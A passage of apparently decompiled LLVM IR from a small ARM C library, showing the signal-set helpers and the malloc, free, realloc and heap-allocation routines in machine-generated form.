  uselistorder i32 %v5_124bc, { 1, 0 }
  uselistorder i32 %v1_124b4, { 0, 2, 1 }
  uselistorder i32 %v2_1247c, { 1, 0 }
  uselistorder i32 %v0_12480.pre, { 1, 0, 2 }
  uselistorder i32 %v10_12470, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_12518, { 2, 0, 1 }
  uselistorder label %dec_label_pc_124ac, { 1, 0 }
  uselistorder label %dec_label_pc_12498, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12528 = add i32 %arg2, -1
  %v3_1252c = udiv i32 %v1_12528, 32
  %v4_12530 = mul nuw nsw i32 %v3_1252c, 4
  %v5_12530 = add i32 %v4_12530, %arg1
  %v6_12530 = inttoptr i32 %v5_12530 to i32*
  %v7_12530 = load i32, i32* %v6_12530, align 4
  %v1_12534 = urem i32 %v1_12528, 32
  %v7_1253c = shl i32 1, %v1_12534
  %v8_1253c = and i32 %v7_12530, %v7_1253c
  %v10_1253c = icmp ne i32 %v8_1253c, 0
  %. = zext i1 %v10_1253c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_12528, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_1254c = load i32, i32* @r1, align 4
  %v1_1254c = add i32 %v0_1254c, -1
  %v3_12550 = udiv i32 %v1_1254c, 32
  %v0_12554 = load i32, i32* @r0, align 4
  %v4_12554 = mul nuw nsw i32 %v3_12550, 4
  %v5_12554 = add i32 %v0_12554, %v4_12554
  %v6_12554 = inttoptr i32 %v5_12554 to i32*
  %v7_12554 = load i32, i32* %v6_12554, align 4
  %v1_12558 = urem i32 %v1_1254c, 32
  %v7_12560 = shl i32 1, %v1_12558
  %v8_12560 = or i32 %v7_12554, %v7_12560
  store i32 %v8_12560, i32* %v6_12554, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1254c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12570 = add i32 %arg2, -1
  %v3_12574 = udiv i32 %v1_12570, 32
  %v4_12578 = mul nuw nsw i32 %v3_12574, 4
  %v5_12578 = add i32 %v4_12578, %arg1
  %v6_12578 = inttoptr i32 %v5_12578 to i32*
  %v7_12578 = load i32, i32* %v6_12578, align 4
  %v1_1257c = urem i32 %v1_12570, 32
  %tmp = shl i32 -1, %v1_1257c
  %v8_12584 = add i32 %tmp, -1
  %v9_12584 = and i32 %v7_12578, %v8_12584
  store i32 %v9_12584, i32* %v6_12578, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12570, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12594 = load i32, i32* @r4, align 4
  %v6_12594 = load i32, i32* @r5, align 4
  %v9_12594 = load i32, i32* @r6, align 4
  %v0_12598 = load i32, i32* %r0.global-to-local, align 4
  %v2_12598 = icmp eq i32 %v0_12598, 0
  %v2_1259c = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_12598, label %bb, label %dec_label_pc_125a8

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125b0

dec_label_pc_125a8:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_12598, -8
  br i1 %tmp, label %dec_label_pc_126b4, label %dec_label_pc_125b0

dec_label_pc_125b0:                               ; preds = %bb, %dec_label_pc_125a8
  %v0_125b0 = phi i32 [ %v0_12598, %dec_label_pc_125a8 ], [ 1, %bb ]
  %v1_125b0 = add i32 %v0_125b0, 4
  store i32 %v1_125b0, i32* %stack_var_-20, align 4
  store i32 %v2_1259c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_28a84.442 to i32), i32* %r0.global-to-local, align 4
  %v1_125c8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_22630.446 to i32), i32* %r0.global-to-local, align 4
  %v3_125d4 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_22630.446 to i32*), i32 %v2_1259c)
  store i32 %v3_125d4, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28a84.442 to i32), i32* %r0.global-to-local, align 4
  store i32 75244, i32* @lr, align 4
  %v1_125e8 = call i32 @__pthread_return_0()
  store i32 %v1_125e8, i32* %r0.global-to-local, align 4
  %v2_125ec = icmp eq i32 %v3_125d4, 0
  br i1 %v2_125ec, label %dec_label_pc_125f4, label %dec_label_pc_126a4

dec_label_pc_125f4:                               ; preds = %dec_label_pc_125b0
  %v2_125f8 = load i32, i32* @global_var_28aac.293, align 4
  store i32 %v2_125f8, i32* @r4, align 4
  %v2_125fc = load i32, i32* %stack_var_-20, align 4
  %v3_12600 = icmp ult i32 %v2_125fc, %v2_125f8
  br i1 %v3_12600, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_125f4
  %v3_12604 = add i32 %v2_125f8, -1
  %v2_12608 = add i32 %v3_12604, %v2_125fc
  %v2_1260c = sub i32 0, %v2_125f8
  %v3_12610 = and i32 %v2_12608, %v2_1260c
  store i32 %v3_12610, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_125f4, %bb14
  store i32 ptrtoint (i32* @global_var_28b74.450 to i32), i32* %r0.global-to-local, align 4
  %v1_1261c = call i32 @__pthread_return_0()
  %v0_12620 = load i32, i32* @r4, align 4
  store i32 %v0_12620, i32* %r0.global-to-local, align 4
  %v1_12624 = call i32 @__GI_sbrk(i32 %v0_12620)
  store i32 %v1_12624, i32* %r0.global-to-local, align 4
  %v7_12628 = icmp eq i32 %v1_12624, -1
  br i1 %v7_12628, label %bb15, label %dec_label_pc_12634

bb15:                                             ; preds = %.thread3
  store i32 %v1_12624, i32* @r5, align 4
  br label %dec_label_pc_12648

dec_label_pc_12634:                               ; preds = %.thread3
  %v1_12634 = add i32 %v1_12624, 3
  %v1_12638 = and i32 %v1_12634, -4
  store i32 %v1_12638, i32* @r5, align 4
  %v9_1263c = icmp eq i32 %v1_12638, %v1_12624
  br i1 %v9_1263c, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_12634
  %v3_12640 = sub i32 %v1_12638, %v1_12624
  store i32 %v3_12640, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_12634, %bb16
  %v1_12644 = xor i1 %v9_1263c, true
  call void @__pseudo_cond_branch(i1 %v1_12644, i32 ptrtoint (i32* @global_var_13bdc.451 to i32))
  br label %dec_label_pc_12648

dec_label_pc_12648:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_28b74.450 to i32), i32* %r0.global-to-local, align 4
  store i32 75352, i32* @lr, align 4
  %v1_12654 = call i32 @__pthread_return_0()
  store i32 %v1_12654, i32* %r0.global-to-local, align 4
  %v0_12658 = load i32, i32* @r5, align 4
  %v7_12658 = icmp eq i32 %v0_12658, -1
  br i1 %v7_12658, label %dec_label_pc_126b4, label %dec_label_pc_12660

dec_label_pc_12660:                               ; preds = %dec_label_pc_12648
  store i32 ptrtoint (i32* @global_var_28a84.442 to i32), i32* %r0.global-to-local, align 4
  %v1_1266c = call i32 @__pthread_return_0()
  %v0_12670 = load i32, i32* @r4, align 4
  %v0_12674 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_22630.446 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_12674, 16777216
  %v2_1267c = sdiv i32 %sext, 16777216
  %v5_1267c = call i32 @__heap_free(i32* bitcast (i32** @global_var_22630.446 to i32*), i32 %v2_1267c, i32 %v0_12670)
  store i32 ptrtoint (i32** @global_var_22630.446 to i32), i32* %r0.global-to-local, align 4
  %v3_12688 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_22630.446 to i32*), i32 %v2_1259c)
  store i32 %v3_12688, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28a84.442 to i32), i32* %r0.global-to-local, align 4
  store i32 75420, i32* @lr, align 4
  %v1_12698 = call i32 @__pthread_return_0()
  store i32 %v1_12698, i32* %r0.global-to-local, align 4
  %v2_1269c = icmp eq i32 %v3_12688, 0
  br i1 %v2_1269c, label %dec_label_pc_126b4, label %dec_label_pc_126a4

dec_label_pc_126a4:                               ; preds = %dec_label_pc_125b0, %dec_label_pc_12660
  %v1_126a8 = phi i32 [ %v3_125d4, %dec_label_pc_125b0 ], [ %v3_12688, %dec_label_pc_12660 ]
  %v2_126a4 = load i32, i32* %stack_var_-20, align 4
  %v2_126a8 = inttoptr i32 %v1_126a8 to i32*
  store i32 %v2_126a4, i32* %v2_126a8, align 4
  %v3_126a8 = load i32, i32* %r4.global-to-local, align 4
  %v4_126a8 = add i32 %v3_126a8, 4
  store i32 %v4_126a8, i32* %r4.global-to-local, align 4
  %v2_126ac = icmp eq i32 %v4_126a8, 0
  br i1 %v2_126ac, label %dec_label_pc_126b4, label %dec_label_pc_126c4

dec_label_pc_126b4:                               ; preds = %dec_label_pc_126a4, %dec_label_pc_125a8, %dec_label_pc_12660, %dec_label_pc_12648
  %v0_126b4 = call i32 @__errno_location()
  store i32 %v0_126b4, i32* %r0.global-to-local, align 4
  %v2_126bc = inttoptr i32 %v0_126b4 to i32*
  store i32 12, i32* %v2_126bc, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_126c4

dec_label_pc_126c4:                               ; preds = %dec_label_pc_126a4, %dec_label_pc_126b4
  %v0_126c4 = phi i32 [ %v4_126a8, %dec_label_pc_126a4 ], [ 0, %dec_label_pc_126b4 ]
  store i32 %v0_126c4, i32* %r0.global-to-local, align 4
  store i32 %v3_12594, i32* @r4, align 4
  store i32 %v6_12594, i32* @r5, align 4
  store i32 %v9_12594, i32* @r6, align 4
  ret i32 %v0_126c4

; uselistorder directives
  uselistorder i32 %v0_126c4, { 1, 0 }
  uselistorder i32 %v3_12688, { 1, 0, 2 }
  uselistorder i32 %v1_12638, { 1, 0, 2 }
  uselistorder i32 %v1_12624, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 %v3_125d4, { 1, 0, 2 }
  uselistorder i32 %v0_12598, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 13, 15, 18, 14, 16, 17, 19, 2, 4, 3, 9, 6, 5, 7, 8, 10, 11, 12, 0, 1 }
  uselistorder i32 (i32*, i32)* @__heap_alloc, { 1, 0 }
  uselistorder label %dec_label_pc_126c4, { 1, 0 }
  uselistorder label %dec_label_pc_126b4, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_126a4, { 1, 0 }
  uselistorder label %dec_label_pc_12648, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_125b0, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_126e8 = load i32, i32* @r0, align 4
  %v2_126e8 = icmp eq i32 %v0_126e8, 0
  %v3_126ec = load i32, i32* @r4, align 4
  store i32 %v3_126ec, i32* %stack_var_-24, align 4
  %v6_126ec = load i32, i32* @r5, align 4
  %v9_126ec = load i32, i32* @r6, align 4
  %v15_126ec = load i32, i32* @r8, align 4
  br i1 %v2_126e8, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_126f4 = add i32 %v0_126e8, -4
  %v2_126f4 = inttoptr i32 %v1_126f4 to i32*
  %v3_126f4 = load i32, i32* %v2_126f4, align 4
  store i32 %v3_126f4, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_22630.446 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_126f4, i32* @r4, align 4
  %v1_1270c = call i32 @__pthread_return_0()
  %v0_12710 = load i32, i32* @r4, align 4
  %v0_12714 = load i32, i32* @r5, align 4
  %v4_1271c = call i32 @__heap_free(i32* bitcast (i32** @global_var_22630.446 to i32*), i32 %v0_12710, i32 %v0_12714)
  %v1_12724 = inttoptr i32 %v4_1271c to i32*
  %v2_12724 = load i32, i32* %v1_12724, align 4
  store i32 %v2_12724, i32* %r6.global-to-local, align 4
  %v2_12728 = load i32, i32* @global_var_28aac.293, align 4
  %v4_1272c = mul i32 %v2_12728, 8
  %v6_1272c = icmp ult i32 %v2_12724, %v4_1272c
  store i32 %v4_1271c, i32* @r4, align 4
  br i1 %v6_1272c, label %dec_label_pc_1276c, label %dec_label_pc_12738

dec_label_pc_12738:                               ; preds = %bb11
  %v1_12740 = call i32 @__pthread_return_0()
  %v1_12748 = call i32 @__GI_sbrk(i32 0)
  %v0_1274c = load i32, i32* @r4, align 4
  %v1_1274c = add i32 %v0_1274c, 12
  store i32 %v1_1274c, i32* @r5, align 4
  %v9_12750 = icmp eq i32 %v1_1274c, %v1_12748
  br i1 %v9_12750, label %dec_label_pc_12774, label %dec_label_pc_12758

dec_label_pc_12758:                               ; preds = %dec_label_pc_12738
  %v1_12764 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1276c

dec_label_pc_1276c:                               ; preds = %bb11, %dec_label_pc_12758, %bb14
  %v2_1276c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1276c, i32* @r4, align 4
  store i32 %v6_126ec, i32* @r5, align 4
  store i32 %v9_126ec, i32* %r6.global-to-local, align 4
  store i32 %v15_126ec, i32* %r8.global-to-local, align 4
  %v0_12770 = call i32 @__pthread_return_0()
  %v0_12774.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12774

dec_label_pc_12774:                               ; preds = %dec_label_pc_12738, %dec_label_pc_1276c
  %v1_1277c = phi i32 [ %v0_1274c, %dec_label_pc_12738 ], [ %v0_12774.pre, %dec_label_pc_1276c ]
  %v1_12774 = add i32 %v1_1277c, 4
  %v2_12774 = inttoptr i32 %v1_12774 to i32*
  %v3_12774 = load i32, i32* %v2_12774, align 4
  %v2_12778 = icmp eq i32 %v3_12774, 0
  br i1 %v2_12778, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_12774
  %v2_1277c = add i32 %v1_1277c, 8
  %v3_1277c = inttoptr i32 %v2_1277c to i32*
  %v4_1277c = load i32, i32* %v3_1277c, align 4
  %v3_12780 = add i32 %v3_12774, 8
  %v4_12780 = inttoptr i32 %v3_12780 to i32*
  store i32 %v4_1277c, i32* %v4_12780, align 4
  %v0_12784.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12774, %bb12
  %v0_12784 = phi i32 [ %v1_1277c, %dec_label_pc_12774 ], [ %v0_12784.pre, %bb12 ]
  %v1_12784 = add i32 %v0_12784, 8
  %v2_12784 = inttoptr i32 %v1_12784 to i32*
  %v3_12784 = load i32, i32* %v2_12784, align 4
  %v1_12788 = add i32 %v0_12784, 4
  %v2_12788 = inttoptr i32 %v1_12788 to i32*
  %v3_12788 = load i32, i32* %v2_12788, align 4
  %v2_1278c = icmp eq i32 %v3_12784, 0
  br i1 %v2_1278c, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_12790 = add i32 %v3_12784, 4
  %v4_12790 = inttoptr i32 %v3_12790 to i32*
  store i32 %v3_12788, i32* %v4_12790, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_12794 = load i32, i32* %r8.global-to-local, align 4
  %v3_12794 = inttoptr i32 %v2_12794 to i32*
  store i32 %v3_12788, i32* %v3_12794, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_127a4 = call i32 @__pthread_return_0()
  %v0_127a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_127a8 = load i32, i32* @r4, align 4
  %v0_127b0 = load i32, i32* @r5, align 4
  %v2_127a8 = sub i32 12, %v0_127a8
  %v1_127ac = add i32 %v2_127a8, %v1_127a8
  %v2_127b0 = sub i32 %v1_127ac, %v0_127b0
  %v1_127b4 = call i32 @__GI_sbrk(i32 %v2_127b0)
  br label %dec_label_pc_1276c

; uselistorder directives
  uselistorder i32 %v0_12784, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 2 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_12774, { 1, 0 }
  uselistorder label %dec_label_pc_1276c, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_127d8 = load i32, i32* @r4, align 4
  store i32 %v3_127d8, i32* %stack_var_-24, align 4
  %v6_127d8 = load i32, i32* @r5, align 4
  %v9_127d8 = load i32, i32* @r6, align 4
  %v12_127d8 = load i32, i32* @r7, align 4
  %v15_127d8 = load i32, i32* @r8, align 4
  %v18_127d8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_127dc = icmp eq i32 %arg2, 0
  %v0_127e0 = load i32, i32* @r0, align 4
  store i32 %v0_127e0, i32* @r7, align 4
  br i1 %v2_127dc, label %dec_label_pc_127e8, label %dec_label_pc_127f0

dec_label_pc_127e8:                               ; preds = %entry
  %v0_127e8 = call i32 @free()
  %v0_127f8.pre = load i32, i32* @r4, align 4
  %v2_127fc.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_127f8

dec_label_pc_127f0:                               ; preds = %entry
  %v2_127f0 = icmp eq i32 %v0_127e0, 0
  br i1 %v2_127f0, label %dec_label_pc_127f8, label %dec_label_pc_12804

dec_label_pc_127f8:                               ; preds = %dec_label_pc_127f0, %dec_label_pc_127e8
  %v2_127fc = phi i32 [ %v3_127d8, %dec_label_pc_127f0 ], [ %v2_127fc.pre, %dec_label_pc_127e8 ]
  %v0_127f8 = phi i32 [ %arg2, %dec_label_pc_127f0 ], [ %v0_127f8.pre, %dec_label_pc_127e8 ]
  store i32 %v2_127fc, i32* @r4, align 4
  store i32 %v6_127d8, i32* @r5, align 4
  store i32 %v9_127d8, i32* @r6, align 4
  store i32 %v12_127d8, i32* @r7, align 4
  store i32 %v18_127d8, i32* @lr, align 4
  %v1_12800 = call i32 @malloc(i32 %v0_127f8)
  %v0_12804.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12804

dec_label_pc_12804:                               ; preds = %dec_label_pc_127f0, %dec_label_pc_127f8
  %v0_1281c = phi i32 [ %v0_127e0, %dec_label_pc_127f0 ], [ %v1_12800, %dec_label_pc_127f8 ]
  %v0_12804 = phi i32 [ %arg2, %dec_label_pc_127f0 ], [ %v0_12804.pre, %dec_label_pc_127f8 ]
  %v1_12804 = add i32 %v0_12804, 7
  %v1_12808 = and i32 %v1_12804, -4
  store i32 %v1_12808, i32* @r5, align 4
  %v2_1280c = icmp ugt i32 %v1_12808, 10
  %v1_12810 = add i32 %v0_1281c, -4
  %v2_12810 = inttoptr i32 %v1_12810 to i32*
  %v3_12810 = load i32, i32* %v2_12810, align 4
  store i32 %v3_12810, i32* @r6, align 4
  br i1 %v2_1280c, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_12804
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_12804, %bb
  %v0_12898 = phi i32 [ %v1_12808, %dec_label_pc_12804 ], [ 12, %bb ]
  store i32 %v1_12810, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_12898, %v3_12810
  br i1 %tmp, label %dec_label_pc_12824, label %dec_label_pc_12898

dec_label_pc_12824:                               ; preds = %bb14
  %v2_12818 = sub i32 %v0_12898, %v3_12810
  %v1_12834 = call i32 @__pthread_return_0()
  %v0_1283c = load i32, i32* @r8, align 4
  %v1_1283c = load i32, i32* @r6, align 4
  %v2_1283c = add i32 %v1_1283c, %v0_1283c
  %v4_12844 = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_22630.446 to i32*), i32 %v2_1283c, i32 %v2_12818)
  store i32 %v4_12844, i32* @r4, align 4
  store i32 75868, i32* @lr, align 4
  %v1_12858 = call i32 @__pthread_return_0()
  %v0_1285c = load i32, i32* @r4, align 4
  %v2_1285c = icmp eq i32 %v0_1285c, 0
  br i1 %v2_1285c, label %dec_label_pc_1286c, label %.thread

.thread:                                          ; preds = %dec_label_pc_12824
  %v1_12860 = load i32, i32* @r6, align 4
  %v3_12860 = add i32 %v1_12860, %v0_1285c
  %v2_12864 = load i32, i32* @r7, align 4
  %v3_12864 = add i32 %v2_12864, -4
  %v4_12864 = inttoptr i32 %v3_12864 to i32*
  store i32 %v3_12860, i32* %v4_12864, align 4
  br label %dec_label_pc_128d8

dec_label_pc_1286c:                               ; preds = %dec_label_pc_12824
  %v0_1286c = load i32, i32* @r5, align 4
  %v1_1286c = add i32 %v0_1286c, -4
  %v1_12870 = call i32 @malloc(i32 %v1_1286c)
  store i32 %v1_12870, i32* @r0, align 4
  store i32 %v1_12870, i32* @r4, align 4
  %v2_12874 = icmp eq i32 %v1_12870, 0
  br i1 %v2_12874, label %dec_label_pc_12890, label %dec_label_pc_1287c

dec_label_pc_1287c:                               ; preds = %dec_label_pc_1286c
  %v0_1287c = load i32, i32* @r6, align 4
  %v1_1287c = add i32 %v0_1287c, -4
  store i32 %v1_1287c, i32* @r2, align 4
  %v0_12880 = load i32, i32* @r7, align 4
  store i32 %v0_12880, i32* @r1, align 4
  %v0_12884 = call i32 @memcpy()
  %v0_12888 = load i32, i32* @r7, align 4
  store i32 %v0_12888, i32* @r0, align 4
  %v0_1288c = call i32 @free()
  %v0_12890.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12890

dec_label_pc_12890:                               ; preds = %dec_label_pc_1286c, %dec_label_pc_1287c
  %v0_12890 = phi i32 [ 0, %dec_label_pc_1286c ], [ %v0_12890.pre, %dec_label_pc_1287c ]
  store i32 %v0_12890, i32* @r7, align 4
  br label %dec_label_pc_128d8

dec_label_pc_12898:                               ; preds = %bb14
  %v1_12898 = add i32 %v0_12898, 28
  %tmp15 = icmp ugt i32 %v1_12898, %v3_12810
  br i1 %tmp15, label %dec_label_pc_128d8, label %dec_label_pc_128a4

dec_label_pc_128a4:                               ; preds = %dec_label_pc_12898
  %v1_128b0 = call i32 @__pthread_return_0()
  %v0_128b4 = load i32, i32* @r8, align 4
  %v1_128b4 = load i32, i32* @r5, align 4
  %v2_128b4 = add i32 %v1_128b4, %v0_128b4
  %v1_128b8 = load i32, i32* @r6, align 4
  %v2_128b8 = sub i32 %v1_128b8, %v1_128b4
  %v4_128c0 = call i32 @__heap_free(i32* bitcast (i32** @global_var_22630.446 to i32*), i32 %v2_128b4, i32 %v2_128b8)
  store i32 75988, i32* @lr, align 4
  %v1_128d0 = call i32 @__pthread_return_0()
  %v0_128d4 = load i32, i32* @r5, align 4
  %v1_128d4 = load i32, i32* @r7, align 4
  %v2_128d4 = add i32 %v1_128d4, -4
  %v3_128d4 = inttoptr i32 %v2_128d4 to i32*
  store i32 %v0_128d4, i32* %v3_128d4, align 4
  br label %dec_label_pc_128d8

dec_label_pc_128d8:                               ; preds = %.thread, %dec_label_pc_12898, %dec_label_pc_12890, %dec_label_pc_128a4
  %v0_128d8 = load i32, i32* @r7, align 4
  store i32 %v9_127d8, i32* @r6, align 4
  store i32 %v15_127d8, i32* @r8, align 4
  ret i32 %v0_128d8

; uselistorder directives
  uselistorder i32 %v1_128b4, { 1, 0 }
  uselistorder i32 %v0_12898, { 1, 2, 0 }
  uselistorder i32 %v3_12810, { 0, 2, 1, 3 }
  uselistorder i32** @global_var_22630.446, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_22630.446 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_128d8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_12890, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_12804, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_128f0 = inttoptr i32 %arg2 to i32*
  %v2_128f0 = load i32, i32* %v1_128f0, align 4
  %v3_128f4 = load i32, i32* @r4, align 4
  store i32 %v3_128f4, i32* %stack_var_-8, align 4
  %v1_128f8 = add i32 %v2_128f0, 3
  %v1_128fc = and i32 %v1_128f8, -4
  store i32 %v1_128fc, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12904 = icmp ugt i32 %v1_128fc, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_1290c = load i32, i32* %arg1, align 4
  store i32 %v2_1290c, i32* %r0.global-to-local, align 4
  br i1 %v2_12904, label %dec_label_pc_12978.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12978.preheader

dec_label_pc_12978.preheader:                     ; preds = %entry, %bb
  %v1_1292c = phi i32 [ %v1_128fc, %entry ], [ 12, %bb ]
  %v2_129789 = icmp eq i32 %v2_1290c, 0
  br i1 %v2_129789, label %dec_label_pc_12980, label %dec_label_pc_12918

dec_label_pc_12918:                               ; preds = %dec_label_pc_12978.preheader, %dec_label_pc_12974
  %v2_12930 = phi i32 [ %v3_12974, %dec_label_pc_12974 ], [ %v2_1290c, %dec_label_pc_12978.preheader ]
  %v1_12918 = inttoptr i32 %v2_12930 to i32*
  %v2_12918 = load i32, i32* %v1_12918, align 4
  store i32 %v2_12918, i32* @ip, align 4
  %v3_1291c = icmp ult i32 %v2_12918, %v1_1292c
  br i1 %v3_1291c, label %dec_label_pc_12974, label %dec_label_pc_12924

dec_label_pc_12924:                               ; preds = %dec_label_pc_12918
  %v1_12924 = add i32 %v1_1292c, 44
  %v3_12928 = icmp ult i32 %v2_12918, %v1_12924
  br i1 %v3_12928, label %dec_label_pc_12938, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_12924
  %v2_1291c.le = sub i32 %v2_12918, %v1_1292c
  store i32 %v2_1291c.le, i32* %v1_12918, align 4
  %v0_12964.pre = load i32, i32* @ip, align 4
  %v0_1296c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_12938:                               ; preds = %dec_label_pc_12924
  %v1_12938 = add i32 %v2_12930, 4
  %v2_12938 = inttoptr i32 %v1_12938 to i32*
  %v3_12938 = load i32, i32* %v2_12938, align 4
  store i32 %v3_12938, i32* %r2.global-to-local, align 4
  %v2_1293c = icmp eq i32 %v3_12938, 0
  br i1 %v2_1293c, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_12938
  %v2_12940 = add i32 %v2_12930, 8
  %v3_12940 = inttoptr i32 %v2_12940 to i32*
  %v4_12940 = load i32, i32* %v3_12940, align 4
  %v3_12944 = add i32 %v3_12938, 8
  %v4_12944 = inttoptr i32 %v3_12944 to i32*
  store i32 %v4_12940, i32* %v4_12944, align 4
  %v0_12948.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12938, %bb27
  %v0_12948 = phi i32 [ %v2_12930, %dec_label_pc_12938 ], [ %v0_12948.pre, %bb27 ]
  %v1_12948 = add i32 %v0_12948, 8
  %v2_12948 = inttoptr i32 %v1_12948 to i32*
  %v3_12948 = load i32, i32* %v2_12948, align 4
  %v1_1294c = add i32 %v0_12948, 4
  %v2_1294c = inttoptr i32 %v1_1294c to i32*
  %v3_1294c = load i32, i32* %v2_1294c, align 4
  %v2_12950 = icmp eq i32 %v3_12948, 0
  br i1 %v2_12950, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_12954 = add i32 %v3_12948, 4
  %v4_12954 = inttoptr i32 %v3_12954 to i32*
  store i32 %v3_1294c, i32* %v4_12954, align 4
  %v1_1295c = load i32, i32* @ip, align 4
  store i32 %v1_1295c, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_12958 = load i32, i32* %r1.global-to-local, align 4
  %v3_12958 = inttoptr i32 %v2_12958 to i32*
  store i32 %v3_1294c, i32* %v3_12958, align 4
  %v1_12960.pre = load i32, i32* @ip, align 4
  store i32 %v1_12960.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_1296c = phi i32 [ %v0_1296c.pre, %.thread._crit_edge ], [ %v1_1295c, %bb28 ], [ %v1_12960.pre, %.thread5 ]
  %v0_12964 = phi i32 [ %v0_12964.pre, %.thread._crit_edge ], [ %v1_1295c, %bb28 ], [ %v1_12960.pre, %.thread5 ]
  %v1_12964 = load i32, i32* %r0.global-to-local, align 4
